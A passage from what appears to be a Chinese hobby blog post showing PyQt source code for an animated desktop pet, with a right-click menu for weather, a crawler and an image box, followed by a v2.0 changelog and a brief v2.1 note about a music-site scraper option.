class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">8</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.jumpping()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                self.moving()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;完成动作的每一帧&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runFrame</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            <span class="keyword">if</span> self.action != <span class="number">3</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moving</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            time.sleep(<span class="number">0.8</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">32</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">1</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-撞墙&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hitwall</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.move(self.x, self.pos().y())</span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-坠落&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fall</span>(<span class="params">self</span>):</span></span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y += <span class="built_in">int</span>(<span class="number">16</span>)</span><br><span class="line">        screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">        <span class="keyword">if</span> (y &gt;= screenRect.height() - self.size().height()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;now is kiss the ground&#x27;</span>)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">1</span></span><br><span class="line">            self.InitTimer(self.randomAct,<span class="number">80</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(x,y)</span><br><span class="line">            self.setImage(self.pet_images[<span class="number">6</span>][<span class="number">0</span>].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-触地&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">touchdown</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.x -= <span class="number">2</span></span><br><span class="line">        self.y -= <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(self.x, self.y)</span><br><span class="line">            self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">            self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-吃瘪&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uncomfortable</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-拖动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dragging</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">3</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-跳跃&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jumpping</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == <span class="number">0</span>:</span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.fallingBody()</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.jumpping_key = <span class="number">0</span></span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.y = self.pos().y()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">48</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            self.y -= self.z</span><br><span class="line">            self.z -= <span class="number">5</span></span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    x = self.pos().x()</span><br><span class="line">                    x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;设置当前显示的图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setImage</span>(<span class="params">self, image</span>):</span></span><br><span class="line">        self.image.setPixmap(QPixmap.fromImage(image))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机导入一个桌面宠物的所有图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomLoadPetImages</span>(<span class="params">self</span>):</span></span><br><span class="line">        cfg = self.cfg</span><br><span class="line">        pet_name = random.choice(<span class="built_in">list</span>(cfg.PET_ACTIONS_MAP.keys()))</span><br><span class="line">        actions = cfg.PET_ACTIONS_MAP[pet_name]</span><br><span class="line">        pet_images = []</span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">            patch = [self.loadImage(os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shime&#x27;</span>+item+<span class="string">&#x27;.png&#x27;</span>)) <span class="keyword">for</span> item <span class="keyword">in</span> action]</span><br><span class="line">            pet_images.append(patch)</span><br><span class="line">        iconpath = os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shimeX.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pet_images, iconpath</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标左右键功能&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mousePressEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.button() == Qt.LeftButton:</span><br><span class="line">            self.InitTimer(self.dragging,<span class="number">80</span>)</span><br><span class="line">            self.is_follow_mouse = <span class="literal">True</span></span><br><span class="line">            self.mouse_drag_pos = event.globalPos() - self.pos()</span><br><span class="line">            event.accept()</span><br><span class="line">            self.setCursor(QCursor(Qt.OpenHandCursor))</span><br><span class="line">        <span class="keyword">elif</span> event.button() == Qt.RightButton:</span><br><span class="line">            self.InitTimer(self.uncomfortable,<span class="number">80</span>)</span><br><span class="line">            self.menu = QMenu(self)</span><br><span class="line">            self.weather = self.menu.addAction(<span class="string">&quot;天气预报&quot;</span>)</span><br><span class="line">            self.crawler = self.menu.addAction(<span class="string">&quot;启动爬虫&quot;</span>)</span><br><span class="line">            self.imagebox = self.menu.addAction(<span class="string">&quot;图片盒子&quot;</span>)</span><br><span class="line">            self.quitA = self.menu.addAction(<span class="string">&quot;退出附属程序&quot;</span>)</span><br><span class="line">            self.quit = self.menu.addAction(<span class="string">&quot;退出桌宠&quot;</span>)</span><br><span class="line">            self.choice = self.menu.exec_(self.mapToGlobal(event.pos()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.weather):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;weather&quot;</span>)</span><br><span class="line">                self.weatherGet()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.crawler):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;crawler&quot;</span>)</span><br><span class="line">                self.crawlerStart()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.imagebox):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;imagebox&quot;</span>)</span><br><span class="line">                self.imageBox()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.quitA):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;quitA&quot;</span>)</span><br><span class="line">                self.quitAttached()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.quit):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">                self.quitPet()</span><br><span class="line"></span><br><span class="line">            self.randomAct()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标移动, 则宠物也移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseMoveEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> Qt.LeftButton <span class="keyword">and</span> self.is_follow_mouse:</span><br><span class="line">            self.move(event.globalPos() - self.mouse_drag_pos)</span><br><span class="line">            event.accept()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标释放时, 取消绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseReleaseEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.setCursor(QCursor(Qt.ArrowCursor))</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;宠物自由落体&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fallingBody</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x=%x : y=%x&quot;</span> %(x,y))</span><br><span class="line">        self.InitTimer(self.fall,<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;导入图像&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadImage</span>(<span class="params">self, imagepath</span>):</span></span><br><span class="line">        image = QImage()</span><br><span class="line">        image.load(imagepath)</span><br><span class="line">        <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机到一个屏幕上的某个位置&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomPosition</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_geo = QDesktopWidget().screenGeometry()</span><br><span class="line">        pet_geo = self.geometry()</span><br><span class="line">        width = (screen_geo.width() - pet_geo.width()) * random.random()</span><br><span class="line">        height = (screen_geo.height() - pet_geo.height()) * random.random()</span><br><span class="line">        self.move(<span class="built_in">int</span>(width), <span class="built_in">int</span>(height))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;天气预报&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">weatherGet</span>(<span class="params">self</span>):</span></span><br><span class="line">        wea.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;启动爬虫&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crawlerStart</span>(<span class="params">self</span>):</span></span><br><span class="line">        pets.close()</span><br><span class="line">        cra.Start()</span><br><span class="line">        pets.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;图片盒子&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">imageBox</span>(<span class="params">self</span>):</span></span><br><span class="line">        box.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出附属程序&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitAttached</span>(<span class="params">self</span>):</span></span><br><span class="line">        wea.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Everything is done!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出桌宠&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitPet</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.close()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    pets = DesktopPet()</span><br><span class="line">    wea = Mainweather()</span><br><span class="line">    palette = QPalette()</span><br><span class="line">    palette.setBrush(QPalette.Background, QBrush(QPixmap(<span class="string">&quot;D:\PythonProject\images\YHellow.png&quot;</span>)))</span><br><span class="line">    wea.setPalette(palette)</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    box = MainBOX()</span><br><span class="line">    pets.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v2.0</li>
<li>date：2022.5.14</li>
<li>type：<ul>
<li>Features：<ul>
<li>新添右键功能：天气预报</li>
<li>新添右键功能：爬虫</li>
<li>新添右键功能：图片盒子</li>
<li>新添右键功能：关闭所有附属程序</li>
</ul>
</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li>desc：<ul>
<li>想做的差不多都做了，下次试试连接网易云的 API</li>
</ul>
</li>
</ul>
<h2 id="DesktopPets-v2-1"><a href="#DesktopPets-v2-1" class="headerlink" title="DesktopPets_v2.1"></a>DesktopPets_v2.1</h2><p>新加入“网易云API”选项，其本质是一个爬虫，可以在 UI 界面选择歌曲</p>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652972355798.png" class width="1652972355798"> 
<p>PS：由于本人不会并发，所以在“网易云爬虫”爬歌的时候，桌宠和 UI 界面都会卡顿</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span 